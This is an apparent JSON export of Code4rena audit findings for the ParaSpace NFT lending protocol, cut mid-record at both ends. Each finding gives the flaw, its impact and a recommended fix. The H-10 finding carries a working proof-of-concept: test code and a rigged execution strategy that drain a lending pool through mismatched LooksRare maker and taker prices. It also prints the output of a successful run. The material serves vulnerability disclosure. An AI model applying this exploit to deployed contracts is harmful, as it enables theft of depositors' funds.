      "content": "\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/libraries/types/DataTypes.sol#L296>\n\nIn ParaSpace marketplace, taker may pass maker's signature and fulfil their bid with taker's NFT. The maker can use credit loan to purchase the NFT provided the health factor is positive in the end.\n\nIn validateAcceptBidWithCredit, verifyCreditSignature  is called to verify maker signed the credit structure.\n\n    function verifyCreditSignature(\n        DataTypes.Credit memory credit,\n        address signer,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) private view returns (bool) {\n        return\n            SignatureChecker.verify(\n                hashCredit(credit),\n                signer,\n                v,\n                r,\n                s,\n                getDomainSeparator()\n            );\n    }\n\nThe issue is that the credit structure does not have a marketplace identifier:\n\n    struct Credit {\n        address token;\n        uint256 amount;\n        bytes orderId;\n        uint8 v;\n        bytes32 r;\n        bytes32 s;\n    }\n\nAs a result, attacker can use the victim's signature for some orderId in a particular marketplace for another one, where this orderId leads to a much lower valued item.<br>\nUser would borrow money to buy victim's valueless item. This would be HIGH impact, but incidentally right now only the SeaportAdapter marketplace supports credit loans to maker (implements matchBidWithTakerAsk). However, it is very likely the supporting code will be added to LooksRareAdapter and X2Y2Adapter as well.<br>\n\nLooksRareExchange supports the function out of the box:\n\n    function matchBidWithTakerAsk(OrderTypes.TakerOrder calldata takerAsk, OrderTypes.MakerOrder calldata makerBid)\n        external\n        override\n        nonReentrant\n    {\n        require((!makerBid.isOrderAsk) && (takerAsk.isOrderAsk), \"Order: Wrong sides\");\n        require(msg.sender == takerAsk.taker, \"Order: Taker must be the sender\");\n        // Check the maker bid order\n        bytes32 bidHash = makerBid.hash();\n        _validateOrder(makerBid, bidHash);\n        (bool isExecutionValid, uint256 tokenId, uint256 amount) = IExecutionStrategy(makerBid.strategy)\n            .canExecuteTakerAsk(takerAsk, makerBid);\n        require(isExecutionValid, \"Strategy: Execution invalid\");\n        // Update maker bid order status to true (prevents replay)\n        _isUserOrderNonceExecutedOrCancelled[makerBid.signer][makerBid.nonce] = true;\n        // Execution part 1/2\n        ...\n    }\n\nSo, this impact would be HIGH but since it is currently not implemented, would downgrade to MED. I understand it can be closed as OOS due to speculation of future code, however I would ask to consider that the likelihood of other Exchanges supporting the required API is particularly high, and take into account the value of this contribution.\n\n### Impact\n\nAttacker can abuse victim's signature for marketplace bid to buy worthless item.\n\n### Recommended Mitigation Steps\n\nCredit structure should contain an additional field \"MarketplaceAddress\".\n\n\n\n***\n\n",
      "summary": "\nThis bug report focuses on a vulnerability in the ParaSpace marketplace. It describes a situation where an attacker can abuse a victim's signature in order to purchase a worthless item. The issue is that the credit structure in the ParaSpace marketplace does not contain a marketplace identifier, which would prevent this abuse. The impact of this vulnerability is classified as HIGH, however due to the fact that the supporting code is not currently implemented, it has been downgraded to MED.\n\nThe bug report suggests that the recommended mitigation step is to add an additional field, \"MarketplaceAddress\", to the credit structure. This would prevent attackers from abusing the victim's signature and would help protect the integrity of the ParaSpace marketplace.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/475",
      "tags": [],
      "finders": [
        "Trust"
      ]
    },
    {
      "id": "25727",
      "title": "[M-15] NFTFloorOracle's assets will use old prices if added back after removal",
      "impact": "MEDIUM",
      "content": "\n`assetFeederMap` mapping has elements of the `FeederRegistrar` structure type, that contains nested `feederPrice` mapping. When an asset is being removed with \\_removeAsset(), its `assetFeederMap` entry is deleted with the plain `delete assetFeederMap[_asset]` operation, which leaves `feederPrice` mapping intact.\n\nThis way if the asset be added back after removal its old prices will be reused via \\_combine() given that their timestamps are fresh enough and the corresponding feeders stay active.\n\n### Impact\n\nOld prices can be irrelevant in the big enough share of cases. The asset can be removed due to its internal issues that are usually coupled with price disruptions, so it is reasonable to assume that recent prices of a removed asset can be corrupted for the same reason that caused its removal.\n\nNevertheless these prices will be used as if they were added for this asset after its return. Recency logic will work as usual, so the issue is conditional on `config.expirationPeriod` being substantial enough, which might be the case for all illiquid assets.\n\nNet impact is incorrect valuation of the corresponding NFTs, that can lead to the liquidation of the healthy accounts, which is the permanent loss of the principal funds for their owners. However, due to prerequisites placing the severity to be medium.\n\n### Proof of Concept\n\n\\_removeAsset() will `delete` the `assetFeederMap` entry, setting its elements to zero:\n\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L296-L305>\n\n```solidity\n    function _removeAsset(address _asset)\n        internal\n        onlyWhenAssetExisted(_asset)\n    {\n        uint8 assetIndex = assetFeederMap[_asset].index;\n        delete assets[assetIndex];\n        delete assetPriceMap[_asset];\n        delete assetFeederMap[_asset];\n        emit AssetRemoved(_asset);\n    }\n```\n\nNotice, that `assetFeederMap` is the mapping with `FeederRegistrar` elements:\n\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L86-L88>\n\n```solidity\n    /// @dev Original raw value to aggregate with\n    // the NFT contract address -> FeederRegistrar which contains price from each feeder\n    mapping(address => FeederRegistrar) public assetFeederMap;\n```\n\n`FeederRegistrar` is a structure with a nested `feederPrice` mapping.\n\n`feederPrice` nested mapping will not be deleted with `delete assetFeederMap[_asset]`:\n\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L32-L41>\n\n```solidity\nstruct FeederRegistrar {\n    // if asset registered or not\n    bool registered;\n    // index in asset list\n    uint8 index;\n    // if asset paused,reject the price\n    bool paused;\n    // feeder -> PriceInformation\n    mapping(address => PriceInformation) feederPrice;\n}\n```\n\nPer operation docs `So if you delete a struct, it will reset all members that are not mappings and also recurse into the members unless they are mappings`:\n\n<https://docs.soliditylang.org/en/latest/types.html#delete>\n\nThis way, if the asset be added back its `feederPrice` mapping will be reused.\n\nOn addition of this old `_asset` only its `assetFeederMap[_asset].index` be renewed:\n\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L278-L286>\n\n```solidity\n    function _addAsset(address _asset)\n        internal\n        onlyWhenAssetNotExisted(_asset)\n    {\n        assetFeederMap[_asset].registered = true;\n        assets.push(_asset);\n        assetFeederMap[_asset].index = uint8(assets.length - 1);\n        emit AssetAdded(_asset);\n    }\n```\n\nThis means that the old prices will be immediately used for price construction, given that `config.expirationPeriod` is big enough:\n\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L397-L430>\n\n```solidity\n    function _combine(address _asset, uint256 _twap)\n        internal\n        view\n        returns (bool, uint256)\n    {\n        FeederRegistrar storage feederRegistrar = assetFeederMap[_asset];\n        uint256 currentBlock = block.number;\n        //first time just use the feeding value\n        if (assetPriceMap[_asset].twap == 0) {\n            return (true, _twap);\n        }\n        //use memory here so allocate with maximum length\n        uint256 feederSize = feeders.length;\n        uint256[] memory validPriceList = new uint256[](feederSize);\n        uint256 validNum = 0;\n        //aggeregate with price from all feeders\n        for (uint256 i = 0; i < feederSize; i++) {\n            PriceInformation memory priceInfo = feederRegistrar.feederPrice[\n                feeders[i]\n            ];\n            if (priceInfo.updatedAt > 0) {\n                uint256 diffBlock = currentBlock - priceInfo.updatedAt;\n                if (diffBlock <= config.expirationPeriod) {\n                    validPriceList[validNum] = priceInfo.twap;\n                    validNum++;\n                }\n            }\n        }\n        if (validNum < MIN_ORACLES_NUM) {\n            return (false, assetPriceMap[_asset].twap);\n        }\n        _quickSort(validPriceList, 0, int256(validNum - 1));\n        return (true, validPriceList[validNum / 2]);\n    }\n```\n\n### Recommended Mitigation Steps\n\nConsider clearing the current list of prices on asset removal, for example:\n\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L296-L305>\n\n```solidity\n    function _removeAsset(address _asset)\n        internal\n        onlyWhenAssetExisted(_asset)\n    {\n+       FeederRegistrar storage feederRegistrar = assetFeederMap[_asset];\n+       uint256 feederSize = feeders.length;\n+       for (uint256 i = 0; i < feederSize; i++) {\n+           delete feederRegistrar.feederPrice[feeders[i]];\n+       }\n        uint8 assetIndex = feederRegistrar.index;\n        delete assets[assetIndex];\n        delete assetPriceMap[_asset];\n        delete assetFeederMap[_asset];\n        emit AssetRemoved(_asset);\n    }\n```\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the `assetFeederMap` mapping present in the code of the NFTFloorOracle contract. This mapping contains elements of the `FeederRegistrar` structure type, which in turn contains a nested `feederPrice` mapping. \n\nWhen an asset is removed with the `_removeAsset()` function, its `assetFeederMap` entry is deleted with the `delete assetFeederMap[_asset]` operation, but the `feederPrice` mapping remains intact. This means that if the asset is added back after being removed, its old prices will be reused via the `_combine()` function, given that their timestamps are fresh enough and the corresponding feeders remain active.\n\nThe issue here is that the old prices of the asset can be irrelevant, as the asset may have been removed due to internal issues that are usually coupled with price disruptions. This can lead to incorrect valuation of the corresponding NFTs, and can possibly result in the liquidation of healthy accounts, which is a permanent loss of the principal funds for their owners.\n\nThe recommended mitigation steps for this issue are to consider clearing the current list of prices on asset removal. This can be done by adding the code snippet given in the report to the `_removeAsset()` function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/459",
      "tags": [],
      "finders": [
        "hyh",
        "Trust",
        "SmartSek",
        "kaliberpoziomka8552"
      ]
    },
    {
      "id": "25726",
      "title": "[M-12] During oracle outages or feeder outages/disagreement, the `ParaSpaceFallbackOracle` is not used",
      "impact": "MEDIUM",
      "content": "\nIf the feeders haven't updated their prices within the default six-hour time window, the floor oracle will revert when requests are made to get the current price, and these reverts are not caught by the wrapper oracle which handles the fallback oracle, so rather than using the fallback oracle in these cases, the calls will revert, leading to liquidations to fail (see my other submission for the full chain from the floor oracle to the liquidation function).\n\nAdditionally, the code uses the deprecated chainlink `latestAnswer()` API for its token requests, which may revert once it is no longer supported\n\n### Proof of Concept\n\n`getPrice()` will fail if the values are stale:\n\n```solidity\nFile: /paraspace-core/contracts/misc/NFTFloorOracle.sol   #1\n\n236      function getPrice(address _asset)\n237          external\n238          view\n239          override\n240          returns (uint256 price)\n241      {\n242 @>       uint256 updatedAt = assetPriceMap[_asset].updatedAt;\n243          require(\n244              (block.number - updatedAt) <= config.expirationPeriod,\n245 @>           \"NFTOracle: asset price expired\"\n246          );\n247          return assetPriceMap[_asset].twap;\n248:     }\n```\n\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L236-L248>\n\nThey can be stale due to too much price skew, or the feeders being down, e.g. due to another bug:\n\n```solidity\nFile: /paraspace-core/contracts/misc/NFTFloorOracle.sol   #2\n\n369          // config maxPriceDeviation as multiple directly(not percent) for simplicity\n370          if (priceDeviation >= config.maxPriceDeviation) {\n371              return false;\n372:         }\n```\n\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L369-L372>\n\n```solidity\nFile: /paraspace-core/contracts/misc/NFTFloorOracle.sol   #3\n\n376      function _finalizePrice(address _asset, uint256 _twap) internal {\n377          PriceInformation storage assetPriceMapEntry = assetPriceMap[_asset];\n378          assetPriceMapEntry.twap = _twap;\n379 @>       assetPriceMapEntry.updatedAt = block.number;\n380          assetPriceMapEntry.updatedTimestamp = block.timestamp;\n381          emit AssetDataSet(\n382              _asset,\n383              assetPriceMapEntry.twap,\n384              assetPriceMapEntry.updatedAt\n385          );\n386:     }\n```\n\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L376-L386>\n\nThe wrapper oracle does not use a try-catch, so it can't swallow these reverts and allow the fallback oracle to be used:\n\n```solidity\nFile: /paraspace-core/contracts/misc/ParaSpaceOracle.sol   #4\n\n114      /// @inheritdoc IPriceOracleGetter\n115      function getAssetPrice(address asset)\n116          public\n117          view\n118          override\n119          returns (uint256)\n120      {\n121          if (asset == BASE_CURRENCY) {\n122              return BASE_CURRENCY_UNIT;\n123          }\n124  \n125          uint256 price = 0;\n126          IEACAggregatorProxy source = IEACAggregatorProxy(assetsSources[asset]);\n127          if (address(source) != address(0)) {\n128 @>           price = uint256(source.latestAnswer());\n129          }\n130          if (price == 0 && address(_fallbackOracle) != address(0)) {\n131 @>           price = _fallbackOracle.getAssetPrice(asset);\n132          }\n133  \n134          require(price != 0, Errors.ORACLE_PRICE_NOT_READY);\n135          return price;\n136:     }\n```\n\n<br><https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/ParaSpaceOracle.sol#L114-L136>\n\n### Recommended Mitigation Steps\n\nUse a try-catch when fetching the normal `latestAnswer()`, and use the fallback if it failed.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a problem with the floor oracle in the Paraspace platform, which is used to get the current price of an asset. If the feeders haven't updated their prices within the default six-hour time window, the floor oracle will revert when requests are made to get the current price, and these reverts are not caught by the wrapper oracle which handles the fallback oracle. This means that rather than using the fallback oracle in these cases, the calls will revert, leading to liquidations to fail. Additionally, the code uses the deprecated chainlink `latestAnswer()` API for its token requests, which may revert once it is no longer supported.\n\nThe bug is caused by the `getPrice()` function in the NFTFloorOracle.sol file, which will fail if the values are stale. This can be due to too much price skew, or the feeders being down, for example due to another bug. The wrapper oracle does not use a try-catch, so it can't swallow these reverts and allow the fallback oracle to be used.\n\nThe recommended mitigation steps are to use a try-catch when fetching the normal `latestAnswer()`, and use the fallback if it failed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/420",
      "tags": [
        "Oracle"
      ],
      "finders": [
        "0x52",
        "Trust",
        "0xNazgul",
        "rbserver",
        "Lambda",
        "Franfran",
        "IllIllI",
        "erictee",
        "RaymondFam",
        "hansfriese",
        "imare",
        "Rolezn",
        "ujamal\\_",
        "Jeiwan",
        "gzeon",
        "skinz",
        "\\_\\_141345\\_\\_",
        "codecustard",
        "rvierdiiev",
        "seyni"
      ]
    },
    {
      "id": "25725",
      "title": "[H-10] Attacker can drain pool using `executeBuyWithCredit` with malicious marketplace payload",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/marketplaces/LooksRareAdapter.sol#L59><br>\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/libraries/logic/MarketplaceLogic.sol#L397>\n\nParaspace supports leveraged purchases of NFTs through PoolMarketplace entry points. User calls buyWithCredit with marketplace, calldata to be sent to marketplace, and how many tokens to borrow.\n\n    function buyWithCredit(\n        bytes32 marketplaceId,\n        bytes calldata payload,\n        DataTypes.Credit calldata credit,\n        uint16 referralCode\n    ) external payable virtual override nonReentrant {\n        DataTypes.PoolStorage storage ps = poolStorage();\n        MarketplaceLogic.executeBuyWithCredit(\n            marketplaceId,\n            payload,\n            credit,\n            ps,\n            ADDRESSES_PROVIDER,\n            referralCode\n        );\n    }\n\nIn executeBuyWithCredit, orders are deserialized from the payload user sent to a DataTypes.OrderInfo structure. Each MarketplaceAdapter is required to fulfil that functionality through getAskOrderInfo:\n\n    DataTypes.OrderInfo memory orderInfo = IMarketplace(marketplace.adapter)\n        .getAskOrderInfo(payload, vars.weth);\n\nIf we take a look at LooksRareAdapter's getAskOrderInfo, it will the consideration parameter using only the MakerOrder parameters, without taking into account TakerOrder params\n\n    (\n        OrderTypes.TakerOrder memory takerBid,\n        OrderTypes.MakerOrder memory makerAsk\n    ) = abi.decode(params, (OrderTypes.TakerOrder, OrderTypes.MakerOrder));\n    orderInfo.maker = makerAsk.signer;\n\n    consideration[0] = ConsiderationItem(\n        itemType,\n        token,\n        0,\n        makerAsk.price, // TODO: take minPercentageToAsk into account\n        makerAsk.price,\n        payable(takerBid.taker)\n    );\n\nThe OrderInfo constructed, which contains the consideration item from maker, is used in \\_delegateToPool, called by \\_buyWithCredit(), called by executeBuyWithCredit:\n\n    for (uint256 i = 0; i < params.orderInfo.consideration.length; i++) {\n        ConsiderationItem memory item = params.orderInfo.consideration[i];\n        require(\n            item.startAmount == item.endAmount,\n            Errors.INVALID_MARKETPLACE_ORDER\n        );\n        require(\n            item.itemType == ItemType.ERC20 ||\n                (vars.isETH && item.itemType == ItemType.NATIVE),\n            Errors.INVALID_ASSET_TYPE\n        );\n        require(\n            item.token == params.credit.token,\n            Errors.CREDIT_DOES_NOT_MATCH_ORDER\n        );\n        price += item.startAmount;\n    }\n\nThe total price is charged to msg.sender, and he will pay it with debt tokens + immediate downpayment.\nAfter enough funds are transfered to the Pool contract, it delegatecalls to the LooksRare adapter, which will do the actual call to LooksRareExchange. The exchange will send the money gathered in the pool to maker, and give it the NFT.\n\nThe issue is that attacker can supply a different price in the MakerOrder and TakerOrder passed as payload to LooksRare. The maker price will be reflected in the registered price charged to user, but taker price will be the one actually transferred from Pool.\n\nTo show taker price is what counts, this is the code in LooksRareExchange.sol:\n\n    function matchAskWithTakerBid(OrderTypes.TakerOrder calldata takerBid, OrderTypes.MakerOrder calldata makerAsk)\n        external\n        override\n        nonReentrant\n    {\n        require((makerAsk.isOrderAsk) && (!takerBid.isOrderAsk), \"Order: Wrong sides\");\n        require(msg.sender == takerBid.taker, \"Order: Taker must be the sender\");\n        // Check the maker ask order\n        bytes32 askHash = makerAsk.hash();\n        _validateOrder(makerAsk, askHash);\n        (bool isExecutionValid, uint256 tokenId, uint256 amount) = IExecutionStrategy(makerAsk.strategy)\n            .canExecuteTakerBid(takerBid, makerAsk);\n        require(isExecutionValid, \"Strategy: Execution invalid\");\n        // Update maker ask order status to true (prevents replay)\n        _isUserOrderNonceExecutedOrCancelled[makerAsk.signer][makerAsk.nonce] = true;\n        // Execution part 1/2\n        _transferFeesAndFunds(\n            makerAsk.strategy,\n            makerAsk.collection,\n            tokenId,\n            makerAsk.currency,\n            msg.sender,\n            makerAsk.signer,\n            takerBid.price,   <--- taker price is what's charged\n            makerAsk.minPercentageToAsk\n        );\n    \t...\n    }\n\nSince attacker will be both maker and taker in this flow,  he has no problem in supplying a strategy which will accept higher taker price than maker price. It will pass this check:\n\n    (bool isExecutionValid, uint256 tokenId, uint256 amount) = IExecutionStrategy(makerAsk.strategy)\n        .canExecuteTakerBid(takerBid, makerAsk);\n\nIt is important to note that for this exploit we can pass a 0 credit loan amount, which allows the stolen asset to be any asset, not just ones supported by the pool. This is because of early return in `_borrowTo()` and `\\repay()` functions.\n\nThe attack POC looks as follows:\n\n1.  Taker (attacker) has 10 DAI\n2.  Pool has 990 DAI\n3.  Maker (attacker) has 1 doodle NFT.\n4.  Taker submits buyWithCredit() transaction:\n\n*   credit amount 0\n*   TakerOrder with 1000 amount\n*   MakerOrder with 10 amount and \"accept all\" execution strategy\n\n5.  Pool will take the 10 DAI from taker and additional 990 DAI from it's own funds and send to Maker.\n6.  Attacker ends up with both 1000 DAI and an nToken of the NFT\n\n### Impact\n\nAny ERC20 tokens which exist in the pool contract can be drained by an attacker.\n\n### Proof of Concept\n\nIn `_pool_marketplace_buy_wtih_credit.spec.ts`, add this test:\n\n    it(\"looksrare attack\", async () => {\n      const {\n        doodles,\n        dai,\n        pool,\n        users: [maker, taker, middleman],\n      } = await loadFixture(testEnvFixture);\n      const payNowNumber = \"10\";\n      const poolVictimNumber = \"990\";\n      const payNowAmount = await convertToCurrencyDecimals(\n        dai.address,\n        payNowNumber\n      );\n      const poolVictimAmount = await convertToCurrencyDecimals(\n        dai.address,\n          poolVictimNumber\n      );\n      const totalAmount = payNowAmount.add(poolVictimAmount);\n      const nftId = 0;\n      // mint DAI to offer\n      // We don't need to give taker any money, he is not charged\n      // Instead, give the pool money\n      await mintAndValidate(dai, payNowNumber, taker);\n      await mintAndValidate(dai, poolVictimNumber, pool);\n      // middleman supplies DAI to pool to be borrowed by offer later\n      //await supplyAndValidate(dai, poolVictimNumber, middleman, true);\n      // maker mint mayc\n      await mintAndValidate(doodles, \"1\", maker);\n      // approve\n      await waitForTx(\n        await dai.connect(taker.signer).approve(pool.address, payNowAmount)\n      );\n      console.log(\"maker balance before\", await dai.balanceOf(maker.address))\n      console.log(\"taker balance before\", await dai.balanceOf(taker.address))\n      console.log(\"pool balance before\", await dai.balanceOf(pool.address))\n      await executeLooksrareBuyWithCreditAttack(\n        doodles,\n        dai,\n        payNowAmount,\n        totalAmount,\n        0,\n        nftId,\n        maker,\n        taker\n      );\n\nIn `marketplace-helper.ts`, please copy in the following attack code:\n\n    export async function executeLooksrareBuyWithCreditAttack(\n        tokenToBuy: MintableERC721 | NToken,\n        tokenToPayWith: MintableERC20,\n        makerAmount: BigNumber,\n        takerAmount: BigNumber,\n        creditAmount : BigNumberish,\n        nftId: number,\n        maker: SignerWithAddress,\n        taker: SignerWithAddress\n    ) {\n      const signer = DRE.ethers.provider.getSigner(maker.address);\n      const chainId = await maker.signer.getChainId();\n      const nonce = await maker.signer.getTransactionCount();\n\n      // approve\n      await waitForTx(\n          await tokenToBuy\n              .connect(maker.signer)\n              .approve((await getTransferManagerERC721()).address, nftId)\n      );\n\n      const now = Math.floor(Date.now() / 1000);\n      const paramsValue = [];\n      const makerOrder: MakerOrder = {\n        isOrderAsk: true,\n        signer: maker.address,\n        collection: tokenToBuy.address,\n        // Listed Maker price not includes payLater amount which is stolen\n        price: makerAmount,\n        tokenId: nftId,\n        amount: \"1\",\n        strategy: (await getStrategyStandardSaleForFixedPrice()).address,\n        currency: tokenToPayWith.address,\n        nonce: nonce,\n        startTime: now - 86400,\n        endTime: now + 86400, // 2 days validity\n        minPercentageToAsk: 7500,\n        params: paramsValue,\n      };\n\n      const looksRareExchange = await getLooksRareExchange();\n\n      const {domain, value, type} = generateMakerOrderTypedData(\n          maker.address,\n          chainId,\n          makerOrder,\n          looksRareExchange.address\n      );\n\n      const signatureHash = await signer._signTypedData(domain, type, value);\n\n      const makerOrderWithSignature: MakerOrderWithSignature = {\n        ...makerOrder,\n        signature: signatureHash,\n      };\n\n      const vrs = DRE.ethers.utils.splitSignature(\n          makerOrderWithSignature.signature\n      );\n\n      const makerOrderWithVRS: MakerOrderWithVRS = {\n        ...makerOrderWithSignature,\n        ...vrs,\n      };\n      const pool = await getPoolProxy();\n      const takerOrder: TakerOrder = {\n        isOrderAsk: false,\n        taker: pool.address,\n        price: takerAmount,\n        tokenId: makerOrderWithSignature.tokenId,\n        minPercentageToAsk: 7500,\n        params: paramsValue,\n      };\n\n      const encodedData = looksRareExchange.interface.encodeFunctionData(\n          \"matchAskWithTakerBid\",\n          [takerOrder, makerOrderWithVRS]\n      );\n\n      const tx = pool.connect(taker.signer).buyWithCredit(\n          LOOKSRARE_ID,\n          `0x${encodedData.slice(10)}`,\n          {\n            token: tokenToPayWith.address,\n            amount: creditAmount,\n            orderId: constants.HashZero,\n            v: 0,\n            r: constants.HashZero,\n            s: constants.HashZero,\n          },\n          0,\n          {\n            gasLimit: 5000000,\n          }\n      );\n\n      await (await tx).wait();\n    }\n\nFinally, we need to change the passed execution strategy. In `StrategyStandardSaleForFixedPrice.sol`, change `canExecuteTakerBid`:\n\n    function canExecuteTakerBid(OrderTypes.TakerOrder calldata takerBid, OrderTypes.MakerOrder calldata makerAsk)\n        external\n        view\n        override\n        returns (\n            bool,\n            uint256,\n            uint256\n        )\n    {\n        return (\n            //((makerAsk.price == takerBid.price) &&\n            //    (makerAsk.tokenId == takerBid.tokenId) &&\n            //    (makerAsk.startTime <= block.timestamp) &&\n            //    (makerAsk.endTime >= block.timestamp)),\n            true,\n            makerAsk.tokenId,\n            makerAsk.amount\n        );\n    }\n\nWe can see the output:\n\n```\nmaker balance before BigNumber { value: \"0\" }\ntaker balance before BigNumber { value: \"10000000000000000000\" }\npool balance before BigNumber { value: \"990000000000000000000\" }\nmaker balance after BigNumber { value: \"1000000000000000000000\" }\ntaker balance after BigNumber { value: \"0\" }\npool balance after BigNumber { value: \"0\" }\n\n  Leveraged Buy - Positive tests\n     looksrare attack (34857ms)\n\n\n  1 passing (54s)\n\n```\n\n### Recommended Mitigation Steps\n\nIt is important to validate that the price charged to user is the same price taken from the Pool contract:\n\n    // In LooksRareAdapter's getAskOrderInfo:\n    require(makerAsk.price, takerBid.price)\n\n\n\n***\n\n \n",
      "summary": "\nThis bug report is about an exploit that allows an attacker to drain any ERC20 tokens that exist in the Pool contract. It is possible because of a mismatch between the MakerOrder and TakerOrder parameters passed as payload to LooksRareAdapter. The MakerOrder parameter is used to construct an OrderInfo structure, which contains the consideration item from maker, and is used in \\_delegateToPool. The total price charged to the user is based on the MakerOrder, but the actual price transferred from the Pool contract is based on the TakerOrder. The attacker can pass a 0 credit loan amount, allowing them to steal any asset supported by the pool. \n\nThe Proof of Concept for the attack is as follows: the attacker has 10 DAI, the pool has 990 DAI, and the attacker has 1 doodle NFT. The attacker submits a buyWithCredit() transaction with a credit amount of 0, a TakerOrder with 1000 amount, and a MakerOrder with 10 amount and \"accept all\" execution strategy. The pool will take the 10 DAI from the attacker and additional 990 DAI from its own funds and send it to the maker. This allows the attacker to end up with both 1000 DAI and an nToken of the NFT.\n\nTo mitigate this issue, it is important to validate that the price charged to the user is the same price taken from the Pool contract. This can be done by adding a require statement in LooksRareAdapter's getAskOrderInfo to check that the MakerOrder and TakerOrder parameters are equal.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/498",
      "tags": [],
      "finders": [
        "Trust"
      ]
    },
    {
      "id": "25724",
      "title": "[H-08] NFTFloorOracle's asset and feeder structures can be corrupted",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L278-L286><br>\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L307-L316>\n\nNFTFloorOracle's `_addAsset()` and `_addFeeder()` truncate the `assets` and `feeders` arrays indices to 255, both using `uint8 index` field in the corresponding structures and performing `uint8(assets.length - 1)` truncation on the new element addition.\n\n`2^8 - 1` looks to be too tight as an **all time** element count limit. It can be realistically surpassed in a couple years time, especially given multi-asset and multi-feeder nature of the protocol. This way this isn't a theoretical unsafe truncation, but an accounting malfunction that is practically reachable given long enough system lifespan, without any additional requirements as asset/feeder turnaround is a going concern state of the system.\n\n### Impact\n\nOnce truncation start corrupting the indices the asset/feeder structures will become incorrectly referenced and removal of an element will start to remove another one, permanently breaking up the structures.\n\nThis will lead to inability to control these structures and then to Oracle malfunction. This can lead to collateral mispricing. Setting the severity to be medium due to prerequisites.\n\n### Proof of Concept\n\n`feederPositionMap` and `assetFeederMap` use `uint8` indices:\n\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L32-L48>\n\n```solidity\nstruct FeederRegistrar {\n    // if asset registered or not\n    bool registered;\n    // index in asset list\n    uint8 index;\n    // if asset paused,reject the price\n    bool paused;\n    // feeder -> PriceInformation\n    mapping(address => PriceInformation) feederPrice;\n}\n\nstruct FeederPosition {\n    // if feeder registered or not\n    bool registered;\n    // index in feeder list\n    uint8 index;\n}\n```\n\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L79-L88>\n\n```solidity\n    /// @dev feeder map\n    // feeder address -> index in feeder list\n    mapping(address => FeederPosition) private feederPositionMap;\n\n    ...\n\n    /// @dev Original raw value to aggregate with\n    // the NFT contract address -> FeederRegistrar which contains price from each feeder\n    mapping(address => FeederRegistrar) public assetFeederMap;\n```\n\nOn entry removal both `assets` array length do not decrease:\n\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L296-L305>\n\n```solidity\n    function _removeAsset(address _asset)\n        internal\n        onlyWhenAssetExisted(_asset)\n    {\n        uint8 assetIndex = assetFeederMap[_asset].index;\n        delete assets[assetIndex];\n        delete assetPriceMap[_asset];\n        delete assetFeederMap[_asset];\n        emit AssetRemoved(_asset);\n    }\n```\n\nOn the contrary, feeders array is being decreased:\n\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L326-L338>\n\n```solidity\n    function _removeFeeder(address _feeder)\n        internal\n        onlyWhenFeederExisted(_feeder)\n    {\n        uint8 feederIndex = 